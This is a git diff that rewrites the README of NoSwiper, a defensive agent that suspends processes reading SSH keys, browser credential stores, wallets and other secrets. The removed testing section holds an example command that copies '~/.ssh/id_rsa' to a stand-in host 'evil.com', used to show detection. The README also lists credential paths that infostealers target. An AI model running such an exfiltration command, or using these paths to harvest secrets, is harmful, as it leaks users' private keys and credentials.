@@ -1,328 +1,114 @@
-# NoSwiper - Advanced Credential Protection Agent
+# NoSwiper
 
-NoSwiper is a sophisticated credential protection agent that monitors and blocks unauthorized access to sensitive files, protecting against credential theft and infostealer malware.
+Stop credential theft before it happens. NoSwiper monitors file access in real-time and kills processes that try to steal your SSH keys, browser cookies, and other secrets.
 
-## Features
+## What it does
 
-- **Real-time monitoring** of file access and command execution
-- **Advanced rule system** with flexible AND/OR logic for access control
-- **Team ID verification** (macOS) - distinguishes Apple-assigned IDs from spoofable signing IDs
-- **Parent process tracking** - automatically stops both violating process and parent
-- **Command-line argument scanning** - detects credentials passed as arguments
-- **Cross-platform support**:
-  - macOS: Uses `eslogger` for real-time monitoring
-  - Linux: `fanotify` support with kernel-level blocking
-  - FreeBSD/NetBSD: DTrace-based monitoring
-  - OpenSolaris/illumos: Native DTrace support
-- **Comprehensive protection** against infostealers targeting:
-  - SSH keys and cloud credentials
-  - Browser password stores (Chrome, Firefox, Safari, Zen, etc.)
-  - Email clients (Mail, Outlook, Thunderbird, Spark)
-  - Cryptocurrency wallets
-  - Password managers (1Password, Bitwarden, KeePass, etc.)
-  - Communication apps (Discord, Slack, Signal, Telegram)
-  - Development tools (Git, Docker, Kubernetes)
+Watches for unauthorized access to:
+- SSH keys and cloud credentials (AWS, GCP, Azure)
+- Browser password stores (Chrome, Firefox, Safari)
+- Cryptocurrency wallets
+- Password managers (1Password, Bitwarden, KeePass)
+- Email clients, Discord, Slack tokens
 
-## Prerequisites
+When something sketchy tries to read your SSH key? SIGSTOP. Parent process gets stopped too.
 
-### macOS
-- macOS 11+ (for `eslogger`)
-- SIP can remain enabled (no special entitlements required)
+## What it doesn't do (YET)
 
-### Linux
-- Kernel 2.6.37+ (for fanotify support)
-- Root privileges (required for fanotify)
+- UI - TBD (will be in Tauri)
+- Persistence - TBD (soon)
+- EndpointSecurityFramework support - TBD (needs permission from Apple)
 
-### BSD/Solaris
-- DTrace support enabled in kernel
-- Root privileges
+## Quick Start
 
-### All Platforms
-- Rust 1.70+ (for building from source)
-- Root/administrator privileges (required for monitoring)
+Run it in monitoring mode, logging violations:
 
-## Building
-
-```bash
-git clone <repository-url>
-cd noswiper
-cargo build --release
-```
-
-## Installation
-
-```bash
-# Copy binary to system location
-sudo cp target/release/noswiper-agent /usr/local/bin/
-
-# macOS: The agent uses unified logging
-# Linux: The agent logs to systemd journal
-# BSD/Solaris: Standard syslog
-```
-
-## Usage
-
-### Basic Usage
-
-```bash
-# Default: Enforce mode (block and suspend unauthorized access)
-sudo noswiper-agent
-
-# Monitor mode (log only, no blocking)
-sudo noswiper-agent --monitor
-
-# Interactive mode (prompt user for decisions)
-sudo noswiper-agent --interactive
-
-# Verbose mode (show all file access, not just protected files)
-sudo noswiper-agent --verbose
-```
-
-### Command Line Options
-
-```bash
-noswiper-agent [OPTIONS]
-
-Options:
-  --monitor        Monitor-only mode (log access attempts but don't block)
-  --interactive    Interactive mode (prompt user via CLI for decisions)
-  --verbose        Show all file opens, not just protected files
-  --stop-parent    Also stop parent process when stopping violator [default: true]
-  --mechanism      Monitoring mechanism:
-                   - auto: Automatically select best available
-                   - eslogger: macOS only, uses eslogger command
-                   - fanotify: Linux only, kernel-level blocking
-                   - dtrace: BSD/Solaris, DTrace-based monitoring
-  --log-level      Log level: debug, info, warn, error [default: info]
-  --show-config    Show current configuration and exit
-  --help           Print help
-  --version        Print version
-```
-
-### Testing the Agent
-
-1. **Start in monitor mode** (recommended for initial testing):
-   ```bash
-   sudo noswiper-agent --monitor --verbose
-   ```
-
-2. **Try accessing protected files**:
-   ```bash
-   # In another terminal, try to access SSH keys
-   cat ~/.ssh/id_rsa
-
-   # Or try to pass protected paths as arguments
-   scp ~/.ssh/id_rsa user@evil.com:/tmp/
-   ```
-
-3. **Check the logs** to see detection in action.
-
-### Example Output
 
 ```
-[2024-01-20 10:15:23] [INFO] NoSwiper agent starting
-[2024-01-20 10:15:23] [INFO] Version: 0.1.0
-[2024-01-20 10:15:23] [INFO] Mode: enforce
-[2024-01-20 10:15:23] [INFO] Monitoring file access with eslogger...
-[2024-01-20 10:15:45] [ERROR] /usr/bin/curl[12345/ppid:5678]: open /Users/alice/.ssh/id_rsa: STOPPED + parent[5678]
-[2024-01-20 10:15:45] [WARN] /usr/bin/python3[23456/ppid:1]: exec with ~/.aws/credentials: DETECTED
+make monitor
 ```
 
-## Configuration System
+Run it in enforcement mode, stopping processes dead in their tracks:
 
-NoSwiper uses a sophisticated rule system embedded at compile time. Rules use flexible AND/OR logic:
 
-### Rule Structure
+```
+make enforce
+```
+
+## Platforms
+
+- **macOS**: Uses eslogger (no SIP disable needed). Can't actually block reads, but kills processes fast.
+- **Linux**: fanotify for real kernel-level blocking
+- **FreeBSD/NetBSD**: DTrace-based monitoring
+- **OpenSolaris**: DTrace (the OG)
+
+## How it works
+
+The agent uses platform-specific APIs to monitor file operations. When a process tries to open a protected file, it checks against allow rules. No match = process gets suspended with SIGSTOP.
+
+Rules are compiled into the binary (see `config/default.yaml`). Uses AND/OR logic:
 
 ```yaml
 protected_files:
   - pattern: "~/.ssh/id_*"
     allow:
-      # Each item in this list is OR'd
-      - basename: "ssh"             # AND conditions within each rule
-        path_pattern: "/usr/bin/*"
-
-      - team_id: "com.apple.Terminal"  # Apple-assigned Team ID (secure)
-        ppid: 1                         # Parent PID must be launchd
-
-      - path_pattern: "/Applications/*/*.app/Contents/MacOS/*"
-        ppid: 1  # Any app from /Applications launched by launchd
+      - base: "ssh"        # Allow ssh binary
+      - base: "git"        # Allow git
+      - team_id: "EQHXZ8M8AV"  # Or anything signed by Google
+        ppid: 1                # ...if launched by launchd
 ```
 
-### Rule Fields
+## Global Exclusions
 
-- **`basename`**: Process name (e.g., "ssh", "git")
-- **`path_pattern`**: Full path with wildcards (e.g., "/usr/bin/*")
-- **`team_id`**: Apple-assigned Team ID (secure, cannot be spoofed)
-- **`signing_id`**: Developer-set signing ID (less secure)
-- **`ppid`**: Parent process ID (1 = launchd on macOS)
-- **`args_pattern`**: Command-line arguments pattern
-- **`uid`**: User ID (for system processes)
+Some processes need access to everything (backup tools, Apple system services). These are configured in `global_exclusions`:
+- Apple system processes from `/System/*`
+- Backup tools like Time Machine, rsync, Syncthing
+- Cloud sync (Dropbox, Google Drive, OneDrive)
 
-### Security Principles
+## Logs
 
-1. **GUI apps require ppid=1**: All macOS GUI applications must be launched by launchd
-2. **CLI tools need specific paths**: Command-line tools must be from `/usr/bin`, `/usr/local/bin`, or `/opt/homebrew/bin`
-3. **Team ID over Signing ID**: Uses secure Apple-assigned Team IDs where possible
-4. **No global trust**: Each protected file explicitly lists its allowed accessors
-
-## Protected Resources
-
-### Credentials & Keys
-- **SSH**: `~/.ssh/id_*`, `~/.ssh/*_key`
-- **Cloud**: AWS, GCP, Azure credentials
-- **GPG**: `~/.gnupg/private-keys*`, `~/.gnupg/secring.gpg`
-- **Package Managers**: npm, pip, cargo, docker tokens
-
-### Browser Data
-- **Chrome/Chromium**: Login Data, Cookies, Web Data
-- **Firefox**: `logins.json`, `key*.db`, `cookies.sqlite`
-- **Safari**: LocalStorage, Databases
-- **Zen Browser**: Full profile protection
-
-### Communication Apps
-- **Discord**: `~/Library/Application Support/discord/Local Storage/`
-- **Slack**: Cookies and Local Storage
-- **Signal**: `sql/db.sqlite`, `config.json`
-- **Telegram**: `tdata/*`
-
-### macOS Keychain
-Special handling for `~/Library/Keychains/login.keychain-db`:
-- Allows all Apple system processes
-- Allows any app from `/Applications` with ppid=1
-- Requires specific team IDs for third-party tools
-
-### Email Clients
-- **Mail.app**: `~/Library/Mail/`, `Accounts.plist`
-- **Outlook**: Profile data and messages
-- **Thunderbird**: Full profile protection
-
-### Password Managers
-- **1Password**, **Bitwarden**, **KeePass**, **LastPass**
-- Protected by specific Team IDs
-
-### Cryptocurrency Wallets
-- **Bitcoin**: `wallet.dat`
-- **Ethereum**: `keystore/*`
-- **Electrum**, **Exodus**, **Atomic Wallet**
-
-## Logging
-
-### macOS
 ```bash
-# View logs using unified logging
-log show --predicate 'process == "noswiper-agent"' --last 1h
-
-# Stream logs
+# macOS
 log stream --predicate 'process == "noswiper-agent"'
+
+# Linux
+journalctl -f | grep noswiper
+
+# See what got blocked
+grep STOPPED /var/log/system.log
 ```
 
-### Linux
+Example output:
+```
+[WARN] /tmp/evil[31337/ppid:1]: open /Users/you/.ssh/id_rsa: STOPPED + parent[1]
+[INFO] /usr/bin/ssh[42/ppid:100]: open /Users/you/.ssh/id_rsa: OK (allowed)
+```
+
+## Building from source
+
+Requires Rust 1.70+. The Makefile handles the rest:
+
 ```bash
-# View systemd journal logs
-journalctl -u noswiper -f
-
-# View with timestamps
-journalctl -u noswiper --since "1 hour ago"
+make          # Debug build
+make release  # Optimized build
+make monitor  # Build and run in monitor mode
 ```
 
-### BSD/Solaris
-```bash
-# View syslog
-tail -f /var/log/messages | grep noswiper
-```
+## Configuration
 
-## Process Handling
+Edit `config/default.yaml` and rebuild. No runtime config yet - rules are baked into the binary for security.
 
-### Enforce Mode (Default)
-- **Immediately suspends** violating process with SIGSTOP
-- **Suspends parent process** if `--stop-parent` is enabled (default)
-- Processes remain suspended (can be resumed with `kill -CONT <pid>`)
+Key concepts:
+- `base`: Process name (like "firefox")
+- `path`: Full path to binary (supports wildcards)
+- `team_id`: Apple developer ID (hard to spoof)
+- `app_id`: Bundle ID (easier to spoof, less secure)
+- `ppid`: Parent PID (1 = launchd on macOS)
 
-### Monitor Mode
-- Logs all violations but takes no action
-- Useful for testing and understanding normal system behavior
+## Known Issues
 
-### Interactive Mode
-- Suspends process temporarily
-- Prompts user for decision via CLI
-- Can whitelist applications for specific credentials
+- macOS can't actually prevent reads, just kills processes after the fact
+- Firefox shows as lowercase "firefox" not "Firefox"
+- No GUI, CLI only
+- Config changes require recompiling
 
-## Security Model
-
-- **Defense in depth**: Multiple layers of verification
-- **Fail closed**: Deny access when uncertain
-- **Path verification**: Executables must be in legitimate locations
-- **Code signature verification**: Validates Team IDs on macOS
-- **Parent process validation**: GUI apps must be launched by launchd (ppid=1)
-- **Command argument scanning**: Detects credentials in command lines
-
-## Platform Support
-
-### macOS (Primary)
-- Full support via `eslogger`
-- Team ID and code signature verification
-- Process suspension via SIGSTOP
-
-### Linux
-- Kernel-level blocking via `fanotify`
-- Real access prevention (not just detection)
-- Package manager verification
-
-### FreeBSD/NetBSD
-- DTrace-based monitoring
-- Process suspension support
-- kqueue support planned
-
-### OpenSolaris/illumos
-- Native DTrace (most mature implementation)
-- Full monitoring capabilities
-
-## Limitations
-
-### Current Version
-- **No custom configuration**: Rules are compiled into binary
-- **No GUI**: Command-line only
-- **macOS**: Cannot truly prevent file reads (only suspend process)
-- **Limited runtime exceptions**: 5-minute whitelist via interactive mode
-
-### Not Protected Against
-- Kernel-level rootkits
-- Direct memory access attacks
-- Processes running before agent starts
-- System binaries (to prevent system breakage)
-
-## Future Roadmap
-
-- [ ] GUI application for desktop users
-- [ ] User-editable configuration files
-- [ ] Endpoint Security Framework support (macOS)
-- [ ] eBPF support for modern Linux kernels
-- [ ] Machine learning for anomaly detection
-- [ ] Centralized management for enterprise
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit changes (`git commit -m 'Add amazing feature'`)
-4. Push to branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## Security Reporting
-
-Found a security issue? Please email security@<domain> instead of using the issue tracker.
-
-## License
-
-Licensed under either of:
-- Apache License, Version 2.0 ([LICENSE-APACHE](LICENSE-APACHE))
-- MIT License ([LICENSE-MIT](LICENSE-MIT))
-
-at your option.
-
-## Acknowledgments
-
-- Apple's Endpoint Security Framework documentation
-- The Rust community for excellent system programming support
-- DTrace community for cross-platform tracing tools
